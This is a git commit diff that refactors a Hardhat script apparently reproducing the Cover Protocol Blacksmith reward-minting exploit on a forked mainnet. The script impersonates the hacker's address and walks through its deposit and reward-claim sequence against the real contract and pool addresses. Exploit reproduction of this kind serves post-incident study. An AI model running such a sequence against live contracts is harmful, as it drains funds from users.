22652ee5e5445a226dfe3e128b03bbd970779c08
thebor1337 <thebor1337@gmail.com>
2023-11-18 11:25:15 +0100

    .

--- scripts/Blacksmith.ts
+++ scripts/Blacksmith.ts
@@ -6,14 +6,6 @@ import balanceABI from "../abi/BalancerPool.json";
 const HACKER = "0x00007569643bc1709561ec2E86F385Df3759e5DD";
 const TARGET_POOL = "0x59686E01Aa841f622a43688153062C2f24F8fDed";
 
-
-const getBlacksmith = async () => {
-	return await ethers.getContractAt(
-		"Blacksmith",
-		"0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5"
-	);
-};
-
 const logData = async (title: string, blacksmith: Blacksmith) => {
 	const poolData = await blacksmith.pools(TARGET_POOL);
 	const accRewardsPerToken = poolData[1];
@@ -42,14 +34,25 @@ const logData = async (title: string, blacksmith: Blacksmith) => {
 };
 
 async function main() {
-    // state of the contract before the first deposit of the hacker
+	// state of the contract before the first deposit of the hacker
 	await reset(RPC_URL, 11542278);
 
 	const hacker = await ethers.getImpersonatedSigner(HACKER);
-    const opponent = await ethers.getImpersonatedSigner("0xDF1AeFb979d180b4d67CCA9Abb4c5108C89dC8A4");
-	const blacksmith = (await getBlacksmith()).connect(hacker);
-	const coverTarget = await blacksmith.cover();
-	const coverToken = await ethers.getContractAt("IERC20", coverTarget);
+	const opponent = await ethers.getImpersonatedSigner(
+		"0xDF1AeFb979d180b4d67CCA9Abb4c5108C89dC8A4"
+	);
+
+	const blacksmith = (
+		await ethers.getContractAt(
+			"Blacksmith",
+			"0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5"
+		)
+	).connect(hacker);
+
+	const coverToken = await ethers.getContractAt(
+		"IERC20",
+		await blacksmith.cover()
+	);
 
 	const pool = new ethers.Contract(TARGET_POOL, balanceABI, ethers.provider);
 
@@ -58,7 +61,7 @@ async function main() {
 	await logData("BEFORE", blacksmith);
 
 	// await time.setNextBlockTimestamp(1609156487);
-    await blacksmith.deposit(TARGET_POOL, 15255552810089260015362n);
+	await blacksmith.deposit(TARGET_POOL, 15255552810089260015362n);
 
 	// there were a lot of users trying to hack the contract.
 	// a user (opponent) withdrew all their funds from the pool after the hacker deposited
@@ -78,10 +81,11 @@ async function main() {
 	await logData("AFTER 2nd DEPOSIT", blacksmith);
 
 	const oldBalance = await coverToken.balanceOf(HACKER);
+
 	// await time.setNextBlockTimestamp(1609156924);
 	await blacksmith.claimRewards(TARGET_POOL);
-	const newBalance = await coverToken.balanceOf(HACKER);
-	const diff = newBalance - oldBalance;
+	
+	const diff = await coverToken.balanceOf(HACKER) - oldBalance;
 
 	await logData("AFTER CLAIM", blacksmith);
 
